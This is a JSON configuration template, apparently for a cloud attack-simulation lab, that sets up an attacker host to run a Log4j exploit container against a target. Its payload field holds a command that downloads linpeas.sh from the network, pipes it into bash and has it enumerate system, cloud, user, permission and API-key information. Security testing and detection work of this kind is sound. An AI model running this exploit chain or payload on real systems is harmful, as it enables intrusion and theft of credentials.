{
  "context" :  {
    "global": {
      "environment"          : "${ environment }",
      "deployment"           : "${ deployment }"
    },
    "gcp" : {
      "enabled": true,
      "osconfig" : {
        "attacker": {
          "execute": {
            "docker_exploit_log4j_app": {
              "enabled": true,
              "attacker_http_port": 8088,
              "attacker_ldap_port": 1389,
              "# uncomment to use dns: attacker_ip": "attacker-public-1-attacker-${ deployment }.${ attacker_dynu_dns_domain }",
              "target_port": 8000,
              "payload": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt"
            }
          }
        }
      }
    }
  }
}